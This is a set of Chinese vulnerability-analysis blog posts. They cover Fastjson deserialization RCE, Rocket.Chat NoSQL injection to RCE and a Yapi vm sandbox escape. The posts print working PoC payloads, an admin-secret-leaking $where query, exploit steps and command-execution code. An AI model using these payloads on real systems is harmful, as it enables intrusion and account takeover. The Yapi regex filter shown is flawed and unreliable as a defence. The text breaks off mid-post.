[{"title":"Fastjson 1.2.22-1.2.24 RCE 漏洞复现分析（二）","url":"https://0x4qe.github.io/Fastjson1.2.22 RCE-2/","content":"因为复现 fastjson 漏洞时发现他们用的都是TemplatesImpl的利用链，于是顺便回到 java安全漫谈 学习一下 java 中字节码动态加载的方法。\nTemplatesImpl 利用链要分析 TemplatesImpl 利用链，首先我们需要了解 JAVA 动态加载字节码的方法。所谓动态加载字节码，是指 JAVA 从字节序列中恢复一个类并在 JAVA 虚拟机中加载的过程。其中ClassLoader是比较常用的方法。ClassLoader一般分三部分完成：loadClass、findClass、defineClass。\n\nloadClass：从已加载的类缓存、父加载器等寻找类，如果没找到则交给findClass\nfindClass：从一个指定的位置寻找类的位置\ndefineClass：处理前面传入的字节码，将其转化为JAVA类\n\ndefineClass这一步在类加载过程中是最核心的，也是我们可以利用的。我们可以简单写一段 demo 来利用defineClass加载类。\nimport java.lang.reflect.Method;\nimport java.util.Base64;\n\npublic class HelloDefineClass &#123;\n    public static void main(String[] args) throws Exception &#123;\n        Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\n        defineClass.setAccessible(true);\n\n        byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA\" +\n                \"Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs\" +\n                \"bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh\" +\n                \"L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry\" +\n                \"ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n\" +\n                \"OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA\" +\n                \"AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\");\n        Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Hello\", code, 0, code.length);\n        hello.newInstance();\n    &#125;\n&#125;\n执行后输出了Hello World因此有了defineClass，我们可以执行任意命令，但可惜的是defineClass是protected属性的，不能直接在外部被访问，因此不能直接被利用。然而有一个 JAVA 内部类重写了defineClass，并且是default属性的，因此我们可以直接从外部访问并加以利用，这个类就是前面说的TemplatesImpl类中的TransletClassLoader。\n为了利用TransletClassLoader#defineClass()，我们向前追踪调用链。可以发现这么一条链：\nTemplatesImpl#getOutputProperties()\n    --&gt;TemplatesImpl#newTransformer()\n        --&gt;TemplatesImpl#getTransletInstance()\n            --&gt;TemplatesImpl#defineTransletClasses()\n                --&gt;TransletClassLoader#defineClass()\n\n其中最前面的这两个方法TemplatesImpl#getOutputProperties()和TemplatesImpl#newTransformer()的作用域都是public。基于这些，我们可以利用newTransformer()写一个简单的POC：\npublic static void main(String[] args) throws Exception &#123;\n// source: bytecodes/HelloTemplateImpl.java\n    byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=\");\n    TemplatesImpl obj = new TemplatesImpl();\n    setFieldValue(obj, \"_bytecodes\", new byte[][] &#123;code&#125;);\n    setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\");\n    setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl());\n    obj.newTransformer();\n&#125;\n\n注意_tfactory必须是一个TransformerFactoryImpl对象，否则进入TemplatesImpl#defineTransletClasses时会报错。另外有一点需要注意，TemplatesImpl需要被加载的类是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类。\n临门一脚学完了TemplatesImpl利用链，我们回到 Fastjson 的链上。其实学到了现在，要点差不多就讲完了，整个漏洞的利用过程如下：\n\nFastjson 在反序列化的过程中会自动调用 setter 和 getter 函数\n在 Fastjson 寻找到对应的反序列化器以后就会调用 smartMatch()函数进行模糊匹配，将 json 中的_outputProperties转化成outputProperties\n随后 Fastjson 就会找到outputProperties方法\n最后就会调用TemplatesImpl利用链造成 RCE。\n\n纵观全过程，唯一没讲到的就是模糊匹配了，我们简单写一个 poc 来边讲边学习吧。\npackage com.example.demo.Controller;\n\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.Feature;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport javassist.*;\n\nimport java.util.Base64;\n\npublic class Poc &#123;\n    public static String generateEvil() throws Exception &#123;\n        ClassPool pool = ClassPool.getDefault();\n        CtClass clas = pool.makeClass(\"Evil\");\n        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));\n        String cmd = \"Runtime.getRuntime().exec(\\\"/bin/code\\\");\";\n        clas.makeClassInitializer().insertBefore(cmd);\n        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));\n\n        clas.writeFile(\"./\");\n\n        byte[] bytes = clas.toBytecode();\n        String EvilCode = Base64.getEncoder().encodeToString(bytes);\n        System.out.println(EvilCode);\n        return EvilCode;\n    &#125;\n    public static void main(String[] args) throws Exception &#123;\n        final String GADGAT_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\";\n        String evil = Poc.generateEvil();\n        String PoC = \"&#123;\\\"@type\\\":\\\"\" + GADGAT_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\" + evil + \"\\\"],'_name':'a.b','_tfactory':&#123;&#125;,\\\"_outputProperties\\\":&#123; &#125;,\" + \"\\\"_name\\\":\\\"a\\\",\\\"allowedProtocols\\\":\\\"all\\\"&#125;\\n\";\n        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);\n    &#125;\n&#125;\n\n调试，跟进代码，具体过程在上一篇文章中有详细分析，这里不多赘述。直接来到JavaBeanDeserializer#deserial第 604 行，调用了parseField，对传入的字符进行匹配：\nboolean match = this.parseField(parser, key, object, type, fieldValues);\n跟进，来到JavaBeanDeserializer#parseField第 743 行，调用了smartMatch：\npublic boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object> fieldValues) &#123;\n        JSONLexer lexer = parser.lexer;\n        FieldDeserializer fieldDeserializer = this.smartMatch(key);\n        // ...\n&#125;\n在smartMatch中，我们传入的_outputProperties被转化成outputProperties：接着传入getFieldDeserializer，获得了我们需要的outputProperties函数并返回：继续跟进，来到了DefaultFieldDeserializer#parseField：\npublic void parseField(DefaultJSONParser parser, Object object, Type objectType, Map&lt;String, Object> fieldValues) &#123;\n    this.setValue(object, value); // object: TemplatesImpl\n&#125;\n跟进，发现此时的method已经是我们希望的outputProperties，并通过method.invode(object) // object: TemplatesImpl成功反射，接下来就是 TemplatesImpl利用链到 RCE 的过程了：1\n","categories":["Java","Fastjson"],"tags":["漏洞分析"]},{"title":"Fastjson 1.2.22-1.2.24 RCE 漏洞复现分析（一）","url":"https://0x4qe.github.io/Fastjson1.2.22 RCE-1/","content":"0x01复现复现过程参照 https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb。\n首先搭建环境，新建一个springboot项目，在pom.xml中添加fastjson依赖：\n&lt;dependency>\n    &lt;groupId>com.alibaba&lt;/groupId>\n    &lt;artifactId>fastjson&lt;/artifactId>\n    &lt;version>1.2.24&lt;/version>\n&lt;/dependency>\n新增一个路由提供反序列化注入点：\n@RestController\npublic class TestController &#123;\n    @RequestMapping(\"/fast1\")\n    public String TestController1(@RequestParam(name = \"cmd\") String cmd) throws ExportException &#123;\n        Object obj = JSON.parseObject(cmd, Object.class, Feature.SupportNonPublicField);\n        System.out.println(obj.getClass().getName());\n        return cmd;\n    &#125;\n&#125;\n写一个恶意类Evil.java，里面包含了setter和getter函数：\npublic class Evil &#123;\n    String cmd;\n\n    public Evil() &#123;\n        System.out.println(\"调用构造函数\");\n    &#125;\n\n    public String getCmd() &#123;\n        System.out.println(\"调用getName\");\n        return cmd;\n    &#125;\n\n    public void setCmd(String cmd) throws Exception &#123;\n        System.out.println(\"调用setName\");\n        this.cmd = cmd;\n        Runtime.getRuntime().exec(this.cmd);\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"Evil&#123;\" + \"cmd='\" + cmd + '\\'' + \"&#125;\";\n    &#125;\n\n&#125;\n启动springboot，传入payload，其中包含了Evil类的位置：\nPOST cmd&#x3D;&#123;&quot;@type&quot;:&quot;com.example.demo.Controller.Evil&quot;,&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;code&quot;&#125;\n即可成功命令执行：控制台输出如下：原理大致为：fastjson 1.2.22-1.2.24版本中反序列化时，会自动调用类的setter和getter函数，而用@type参数可以让fastjson将数据反序列化成我们指定的恶意类，以此可以达到反序列化到任意命令执行的目的。今天摸了，明天再调试分析自动调用的原因。\n0x02自动调用原因研究（2022-03-30）参考前辈们的分析，在com.alibaba.fastjson.util.JavaBeanInfo的build()函数中第342行：\npublic static JavaBeanInfo build(Class&lt;?> clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) &#123;\n    // come codes ......\n    if (methodName.startsWith(\"set\")) &#123;\n        char c3 = methodName.charAt(3);\n        // ...\n    &#125;\n&#125;\n开始了对setter函数的判断，我们在这里下断点，然后调用payload调试分析调用链：\n跟踪调用链发现，在DefaultJSONParser.parserObject()\npublic final Object parseObject(Map object, Object fieldName) &#123;\n    JSONLexer lexer = this.lexer;\n    if (lexer.token() == 8) &#123;\n        lexer.nextToken();\n        return null;\n    &#125; else if (lexer.token() != 12 &amp;&amp; lexer.token() != 16) &#123;\n        throw new JSONException(\"syntax error, expect &#123;, actual \" + lexer.tokenName() + \", \" + lexer.info());\n    &#125; else &#123;\n        // ...\n        ObjectDeserializer deserializer = this.config.getDeserializer(clazz);\n        thisObj = deserializer.deserialze(this, clazz, fieldName);\n    &#125;\n首先根据token判断是否进入下面的函数块，根据JSONLexeBase.newToken()可以得知token的值和字符的对应关系，例如&#123;的token是12，&#39;是16。继续向下跟进，在第274行对key的值进行了判断，如果为@type则加载对应值中的类：\nif (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;\n    // JSON.DEFAULT_TYPE_KEY = '@type'\n    ref = lexer.scanSymbol(this.symbolTable, '\"');\n    Class&lt;?> clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());\n    // ...\n    // 然后在第318行对用户指定的类进行反序列化\n    ObjectDeserializer deserializer = this.config.getDeserializer(clazz);\n&#125;\n继续跟进，在第ParserConfig.getDeserializer()第318行左右对反序列化的类进行了黑名单的判断：之后会经过一系列的判断，最后会执行createJavaBeanDeserializer()创建一个JavaBeanDeserializer类：然后跟入JavaBeanInfo.build()第318行，进行setter和getter函数的判断：\nif (methodName.length() >= 4 &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;\n    // ...\n    if (methodName.startsWith(\"set\")) &#123;\n        char c3 = methodName.charAt(3);\n        String propertyName;\n        if (!Character.isUpperCase(c3) &amp;&amp; c3 &lt;= 512) &#123;\n            if (c3 == '_') &#123;\n                propertyName = methodName.substring(4);\n            &#125; else if (c3 == 'f') &#123;\n                propertyName = methodName.substring(3);\n            &#125; else &#123;\n                if (methodName.length() &lt; 5 || !Character.isUpperCase(methodName.charAt(4))) &#123;\n                    continue;\n                &#125;\n                propertyName = TypeUtils.decapitalize(methodName.substring(3));\n            &#125;\n            // ...\n        &#125;\n    &#125;\n    add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));\n&#125;\n对于setter函数，方法名长度&gt;4、不是静态方法、返回值不为void或自己本身，即可添加到FieldInfo中。\nif (methodName.length() >= 4 &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(\"get\") &amp;&amp; Character.isUpperCase(methodName.charAt(3)) &amp;&amp; method.getParameterTypes().length == 0 &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;\n    // ...\n    add(fieldList, new FieldInfo(propertyName, method, (Field)null, clazz, type, 0, 0, 0, annotation, (JSONField)null, (String)null));\n&#125;\n对于getter函数，方法名长度&gt;4、不是静态方法、方法名开头为get、方法名第四位为大写、方法入参个数为0、方法返回的类型必须继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong，即可将getter函数写入FieldInfo。\n最后返回JavaBeanInfo，其中beanInfo中包含了我们类中的各种信息\nreturn new JavaBeanInfo(clazz, builderClass, defaultConstructor, (Constructor)null, (Method)null, buildMethod, jsonType, fieldList);\n然而这还没有解决为什么会自动调用setter和getter的问题，不用着急，我们接着跟进，在DefaultJSONParser.parserObject()第319行，我们已经获得了反序列化器，接下来对我们的类调用反序列化：\nthisObj = deserializer.deserialze(this, clazz, fieldName);\n跟进去后发现进入了asm操作的阶段，没办法显性调试了。但是问题不大，我们可以静态分析。在JavaBeanDeserializer第284行方法deserialze()中，对我们的类进行反序列化。第608行中调用了createInstance()，对类进行实例化，会调用无参数的构造函数。\nobject = this.createInstance(parser, type);\n接下来的第560行，调用了DefaultFieldDeserializer.parseFiled()\nif (matchField) &#123;\n    if (!valueParsed) &#123;\n        fieldDeser.parseField(parser, object, type, fieldValues);\n    &#125;\n    // ...\n&#125;\n第79行调用了关键函数：\nthis.setValue(object, value);\n跟进FieldDeserializer.setValue()如果不存在setter、getter、isxx函数，则利用反射机制将value赋值到object上，如果存在这些函数，如果同时存在getter和setter，则调用setter，如果只存在getter则调用getter。至此为止自动调用setter、getter函数的过程分析完了。\n","categories":["Java","Fastjson"],"tags":["漏洞分析"]},{"title":"Rocket.Chat 远程命令执行漏洞分析","url":"https://0x4qe.github.io/Rocket.Chat RCE/","content":"文章首发于 paper.seebug.org。\n0x01 简述Rocket.Chat 是一个开源的完全可定制的通信平台，由 Javascript 开发，适用于具有高标准数据保护的组织。\n2021年3月19日，该漏洞在 HackerOne 被提出，于2021年4月14日被官方修复。该漏洞主要是因为 Mongodb 的查询语句是类 JSON 形式的，如&#123;&quot;_id&quot;:&quot;1&quot;&#125;。由于对用户的输入没有进行严格的检查，攻击者可以通过将查询语句从原来的字符串变为恶意的对象，例如&#123;&quot;_id&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;即可查询 _id 值不等于 1 的数据。\n影响版本3.12.1&lt;= Rocket.Chat &lt;=3.13.2\n0x02 复现复现环境为 Rocket.Chat 3.12.1。\n使用 pocsuite3 编写 PoC，利用 verify 模式验证。\n\n0x03 漏洞分析该漏洞包含了两处不同的注入，漏洞细节可以在这篇文章中找到，同时还可以找到文章作者给出的 exp。第一处在server/methods/getPasswordPolicy.js，通过 NoSQL 注入来泄露重置密码的 token。\ngetPasswordPolicy(params) &#123;\n\t\tconst user = Users.findOne(&#123; 'services.password.reset.token': params.token &#125;);\n\t\tif (!user &amp;&amp; !Meteor.userId()) &#123;\n\t\t\tthrow new Meteor.Error('error-invalid-user', 'Invalid user', &#123;\n\t\t\t\tmethod: 'getPasswordPolicy',\n\t\t\t&#125;);\n\t\t&#125;\n\t\treturn passwordPolicy.getPasswordPolicy();\n\t&#125;\n\n这里的 params 是用户传入的参数，正常来说，params.token 是一串随机字符串，但在这里可以传一个包含正则表达式的查询语句 &#123;&#39;$regex&#39;:&#39;^A&#39;&#125;，例如下面这个例子意为查找一处 token 是以大写字母 A 为开头的数据。通过这个漏洞就可以逐字符的爆破修改密码所需的 token。\nUsers.findOne(&#123; \n\t'services.password.reset.token': &#123;\n        '$regex': '^A'\n    &#125; \n&#125;)\n\n第二处漏洞在 app/api/server/v1/users.js，需要登陆后的用户才能访问，通过这处注入攻击者可以获得包括 admin 在内的所有用户的信息。注入点代码如下：\nAPI.v1.addRoute('users.list', &#123; authRequired: true &#125;, &#123;\n\tget() &#123;\n\t\t// ...\n\t\tconst &#123; sort, fields, query &#125; = this.parseJsonQuery();\n\t\tconst users = Users.find(query, &#123;/*...*/&#125;).fetch();\n\t\treturn API.v1.success(&#123;\n\t\t\tusers,\n\t\t\t// ...\n\t\t&#125;);\n\t&#125;,\n&#125;);\n\n这处注入需要了解的知识点是，mongo 中的 $where 语句，根据文档，查询语句以这种形式展现 &#123; $where: &lt;string|JavaScript Code&gt; &#125;，因此攻击者可以注入 JavaScript 代码，通过将搜索的结果以报错的形式输出。光说可能难以理解，通过一个例子就能很好地说明了。\n攻击者可以传入这样的 query：&#123;&quot;$where&quot;:&quot;this.username===&#39;admin&#39; &amp;&amp; (()=&gt;&#123; throw this.secret &#125;)()&quot;&#125;，就会构成下面这样的查询语句，意为查询 username 为 admin 的用户并将他的信息通过报错输出。\nUsers.find(\n\t&#123;\n\t\t\"$where\":\"this.username==='admin' &amp;&amp; (()=>&#123; throw JSON.stringify(this) &#125;)()\"\n\t&#125;, \n\t&#123;/*...*/&#125;\n).fetch();\n\n通过这个漏洞，就可以获得 admin 的修改密码的 token 和 2FA 的密钥，即可修改 admin 的密码，达到了提权的目的。Rocket.Chat 还为管理员账户提供了创建 web hooks 的功能，这个功能用到了 Node.js 的 vm 模块，而 vm 模块可以通过简单的原型链操作被逃逸，达到任意命令执行的效果。至此，我们了解到了这一个命令执行漏洞的所有细节，接下来就通过分析漏洞发现者提供的 exp 来讲一下漏洞利用的过程。\n0x04 漏洞利用这部分内容基于漏洞发现者给出的 exp，并结合我在复现过程中遇到的问题提出改进意见。\n# Getting Low Priv user\nprint(f\"[+] Resetting &#123;lowprivmail&#125; password\")\n## Sending Reset Mail\nforgotpassword(lowprivmail,target)\n\n## Getting reset token through blind nosql injection\ntoken = resettoken(target)\n\n## Changing Password\nchangingpassword(target,token)\n\n首先通过 getPasswordPolicy() 处的 token 泄露漏洞，修改普通用户的密码。然而需要注意的是，修改密码的 token 长度为 43 个字符，这个爆破的工作量是很大的，且耗时非常长。因此在获取普通用户权限这一步，可以直接通过注册功能完成，而不需要爆破验证的 token。试想若是攻击目标关闭了注册功能，那意味着我们无法获取到已注册用户的信息，也就无计可施了。\n# Privilege Escalation to admin\n## Getting secret for 2fa\nsecret = twofactor(target,lowprivmail)\n\n第二步是获取管理员账号的 2FA 密钥，其中的 twofactor() 利用了第二处漏洞。\ndef twofactor(url,email):\n\t# Authenticating\n\t# ...\n\tprint(f\"[+] Succesfully authenticated as &#123;email&#125;\")\n\n\t# Getting 2fa code\n\tcookies = &#123;'rc_uid': userid,'rc_token': token&#125;\n\theaders=&#123;'X-User-Id': userid,'X-Auth-Token': token&#125;\n\tpayload = '/api/v1/users.list?query=&#123;\"$where\"%3a\"this.username%3d%3d%3d\\'admin\\'+%26%26+(()%3d>&#123;+throw+this.services.totp.secret+&#125;)()\"&#125;'\n\tr = requests.get(url+payload,cookies=cookies,headers=headers)\n\tcode = r.text[46:98]\n\n在这个函数中直接默认了管理员账号的 username 为 “admin”，但是经过测试，并不是所有可攻击的目标都以 “admin” 作为 username，那么就需要一种方法来获取管理员账号的 username。观察 mongodb 中存储的用户数据：\n&#123;\n\t\"_id\" : \"x\", \n\t...\n\t\"services\" : &#123; \n\t\t\"password\" : &#123; \n\t\t\t...\n\t\t&#125;, \n\t\t...,\n\t\t\"emails\" : [ &#123; \n\t\t\t\"address\" : \"x@x.com\", \n\t\t\t\"verified\" : true\n\t\t&#125; ], \n\t\t\"roles\" : [ \"admin\" ], \n\t\t\"name\" : \"username\",\n    \t...\n&#125;\n\n每一个用户字段中都有一条&#123;&quot;roles&quot;:[&quot;&quot;]&#125;，通过&#123;&quot;$where&quot;:&quot;this.roles.indexOf(&#39;admin&#39;)&gt;=0&quot;&#125;来查询管理员账号的信息，随后便可获取管理员的 username。\n第三步是修改管理员账号的密码，以获得 admin 的权限。\n## Sending Reset mail\nprint(f\"[+] Resetting &#123;adminmail&#125; password\")\nforgotpassword(adminmail,target)\n\n## Getting admin reset token through nosql injection authenticated\ntoken = admin_token(target,lowprivmail)\n\n## Resetting Password\ncode = oathtool.generate_otp(secret)\nchangingadminpassword(target,token,code)\n\n其中 forgotpassword() 这一步不可缺少，因为每次通过 reset token 来修改密码以后，后台会自动删除该 token。在本地测试的时候，因为没有 forgotpassword() 这一步，所以每次执行过 changingadminpassword() 以后，都会因为缺少 reset token 导致下一次 PoC 执行失败。通过断点调试找到了问题所在。\n在.meteor/local/build/programs/server/packages/accounts-password.js line 1016\nresetPassword: function () &#123;\n    // ...\n\ttry &#123;\n        // Update the user record by:\n        // - Changing the password to the new one\n        // - Forgetting about the reset token that was just used\n        // - Verifying their email, since they got the password reset via email.\n        const affectedRecords = Meteor.users.update(&#123;\n            'services.password.reset.token': token\n        &#125;, &#123;\n            $unset: &#123;\n                'services.password.reset': 1,\n            &#125;\n        &#125;);\n    &#125;\n&#125;\n\n每一次执行 resetPassword() 以后，都会清空 token。同样在这个文件中，可以找到用于生成 reset.token 的函数 generateResetToken()。在此文件中共有三次出现，其中一次是函数定义，两次是调用，分别于第 898 行和第 938 行被 sendResetPasswordEmail() 和 sendEnrollmentEmail() 调用。\nAccounts.sendResetPasswordEmail = (userId, email, extraTokenData) => &#123;\n  const &#123;/*...*/&#125; = Accounts.generateResetToken(userId, email, 'resetPassword', extraTokenData);\n\nsendResetPasswordEmail() 在申请重置密码的时候被调用，sendEnrollmentEmail() 在用户刚注册的时候被调用。因此，想要获得 reset.token 的值，就要先发起一个重置密码的请求，让后台发送一封重置密码的邮件。\n最后一步就是执行任意命令了。\n## Authenticating and triggering rce\n\nwhile True:\n\tcmd = input(\"CMD:> \")\n\tcode = oathtool.generate_otp(secret)\n\trce(target,code,cmd)\n\n由于命令执行没有回显，因此我的做法是在本地监听一个端口起一个 HTTP 服务器，然后执行 wget HTTP服务器地址/$&#123;random_str&#125;，如果 HTTP 服务器收到了路由为 /$&#123;random_str&#125;的请求，则证明该服务存在漏洞。\n0x05 后记这次复现经过了挺长的时间，主要是由于这个漏洞利用的条件比较苛刻，需要满足各种限制条件，比如需要开放注册功能、管理员账号开启了 2FA、被攻击目标的版本满足要求。不过通过耐心的分析，把复现过程中遇到的问题一一解决，我还是很高兴的。\n0x06 防护方案1、更新 Rocket.Chat 至官方发布的最新版。\n0x07 相关链接1、Rocket.Chat\n2、pocsuite3\n3、NoSQL Injections in Rocket.Chat 3.12.1: How A Small Leak Grounds A Rocket\n4、Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) (2)\n5、mongo 文档\n","categories":["JavaScript","mongodb"],"tags":["漏洞分析"]},{"title":"Yapi 远程命令执行漏洞分析","url":"https://0x4qe.github.io/Yapi1.9.2 RCE/","content":"文章首发于 paper.seebug.org。\n0x01 简述Yapi 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。\n2021年7月8日，有用户在 GitHub 上发布了遭受攻击的相关信息。攻击者通过注册用户，并使用 Mock 功能实现远程命令执行。命令执行的原理是 Node.js 通过 require(&#39;vm&#39;) 来构建沙箱环境，而攻击者可以通过原型链改变沙箱环境运行的上下文，从而达到沙箱逃逸的效果。通过 vm.runInNewContext(&quot;this.constructor.constructor(&#39;return process&#39;)()&quot;) 即可获得一个 process 对象。\n影响版本Yapi &lt;= 1.9.2 \n0x02 复现复现环境为 Yapi 1.9.2，Docker 环境已上传到 Dokcer Hub。\n攻击者通过注册功能注册一个新用户，在新建项目页面创建一个新项目。\n\n在设置 -&gt; 全局 mock 脚本中添加恶意代码。设置命令为反弹 shell 到远程服务器。\n\nPOC如下：\n\n随后添加接口，访问提供的 mock 地址。\n\n随后即可在远程服务器上收到来自命令执行反弹的 shell。\n\n0x03 漏洞分析在 Github 上发布的新版本 1.9.3 已经修复了这个漏洞。https://github.com/YMFE/yapi/commit/37f7e55a07ca1c236cff6b0f0b00e6ec5063c58e\n核心问题在server/utils/commons.js line 635\n\n修复后的代码引入了新的动态脚本执行模块 safeity，替换了原有的 vm 模块。根据 Node.js 官方的描述\n\n The vm module is not a security mechanism. Do not use it to run untrusted code.\n\nvm 模块并不是一个完全安全的动态脚本执行模块。先来看看 vm 有哪些执行命令的函数。\n\n根据官方文档，这三个函数都有一个参数 contextObject 用来表示上下文。但是这个上下文并不是完全隔离地运行的，可以通过原型链的形式实现沙箱逃逸。\n> vm.runInNewContext(\"this\")\n&#123;&#125; // this 是一个空对象\n\n> vm.runInNewContext(\"this.constructor\")\n[Function: Object] // 通过 this.constructor 可以获得一个对象的构造方法\n\n> vm.runInNewContext(\"this.constructor('a')\")\n[String: 'a'] // 获得了一个字符串对象\n\n> vm.runInNewContext(\"this.constructor.constructor('return process')\")\n[Function: anonymous] // 获得了一个匿名函数 function() &#123; return process; &#125;\n\n> vm.runInNewContext(\"this.constructor.constructor('return process')()\")\nprocess &#123;\n  title: 'node',\n  version: 'v10.19.0',\n  ...\n&#125; // 获得了一个 process() 函数的执行结果\n  // 接下来就可以通过 process.mainModule.require('chile_process').execSync('command') 来执行任意代码\n\n有一种防护方案是将上下文对象的原型链赋值成 null，就可以防止利用 this.constructor 进行沙盒逃逸。const contextObject = Object.create(null)，但是这种方法有个缺点，这样禁用了内置的函数，业务需求完全得不到实现。有文章Node.js沙盒逃逸分析提到可以用 vm.runInNewContext(&#39;&quot;a&quot;.constructor.constructor(&quot;return process&quot;)().exit()&#39;, ctx);绕过原型链为 null 的限制。测试后发现无效，如果不考虑业务需求的话，Object.create(null)应该是一种终极的解决方案了。\n接下来我们可以下断点跟进看看漏洞是如何被利用的。在server/utils/commons.js line 635处下断点，构造 mock 脚本，然后访问 mock 接口，程序运行停止在断点处。使用 F11 Step into 进入server/utils/conmmons.js处，单步调试至line 289，再用 F11 进入沙盒环境。\nconst sandbox = this // 将沙盒赋给了变量 sandbox\nconst process = this.constructor.constructor('return process')() // 利用原型链进行沙盒逃逸获得 process 对象\nmockJson = process.mainModule.require('child_process').execSync('whoami &amp;&amp; ps -ef').toString() // 给 sandbox.mockJson 赋值了命令执行的结果\n函数执行结束后会调用 context.mockJson = sandbox.mockJson 并将 mockJson 作为 req.body 返回用户，于是就可以在页面中看到命令执行的反馈。\n0x04 防护方案1、在 Mock 功能中加入对恶意代码的过滤。找到文件 api/common/postmanLib.js 的第178行，在函数 function sandboxByNode(sandbox = &#123;&#125;, script) 的开始添加一段过滤： const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;\n2、如果没有使用注册的需求，建议关闭 Yapi 的注册功能。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。\n3、如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能。\n0x05 相关链接1、高级Mock可以获取到系统操作权限2、Node.js命令执行和沙箱安全3、Node.js沙盒逃逸分析\n","categories":["JavaScript","De-Obfuscation"],"tags":["漏洞分析"]},{"title":"DEFCON2021 Quals threefactooorx","url":"https://0x4qe.github.io/DEFCON Quals 2021 threefactooorx/","content":"反混淆插件源码的主要部分在 content_script.js， 但因为经过混淆，根本不是给人看的，于是得先反混淆。考虑到 js 